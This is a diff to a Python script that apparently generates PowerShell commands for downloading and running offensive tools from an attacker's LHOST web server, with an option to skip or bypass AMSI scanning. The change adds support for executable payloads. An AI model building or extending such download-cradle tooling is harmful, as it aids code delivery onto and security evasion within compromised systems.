@@ -11,7 +11,7 @@ def b64_encode(s):
   b64_str = b64_encoded.decode("utf-8")
   return b64_str
 
-def get_tool(tool_name, cs_tools, ps_tools, zip_tools):
+def get_tool(tool_name, cs_tools, ps_tools, zip_tools, exe_tools):
   if tool_name in cs_tools.keys():
     tool_type = 'cs'
     tool = cs_tools[tool_name]
@@ -21,6 +21,9 @@ def get_tool(tool_name, cs_tools, ps_tools, zip_tools):
   elif tool_name in ps_tools.keys():
     tool_type = 'ps'
     tool = ps_tools[tool_name]
+  elif tool_name in exe_tools.keys():
+    tool_type = 'exe'
+    tool = exe_tools[tool_name]
 
   return tool,tool_type
 
@@ -55,6 +58,8 @@ def get_tool_cmd(tool, tool_type, args, altcmd=None):
 
   elif tool_type == 'zip':
     s += ak.PS_UNZIP_CMD.format(LHOST=ak.LHOST, tool=tool['location'])
+  elif tool_type == 'exe':
+    s += ak.PS_EXE_DL.format(LHOST=ak.LHOST, tool=tool['location'], cmd=tool['cmd'])
   else:
     print(f"Invalid type {tool_type} for command {tool}")
     sys.exit(1)
@@ -68,10 +73,12 @@ def main():
   cs_tools = ak.conf['cs_tools']
   ps_tools = ak.conf['ps_tools']
   zip_tools = ak.conf['zip_tools']
+  exe_tools = ak.conf['exe_tools']
 
   all_tools = list(cs_tools.keys())
   all_tools += ps_tools.keys()
   all_tools += zip_tools.keys()
+  all_tools += exe_tools.keys()
 
   parser = argparse.ArgumentParser()
   parser.add_argument('--no-amsi',  dest='amsi', action='store_false')
@@ -80,7 +87,7 @@ def main():
 
   args = parser.parse_args()
 
-  tool,tool_type = get_tool(args.tool, cs_tools, ps_tools, zip_tools)
+  tool,tool_type = get_tool(args.tool, cs_tools, ps_tools, zip_tools, exe_tools)
 
   if not os.path.exists(ak.WEBROOT + "/" + tool['location']):
     print("WARNING: Tool not found at: " + ak.WEBROOT + "/" + tool['location'] + "\r\n", file=sys.stderr)
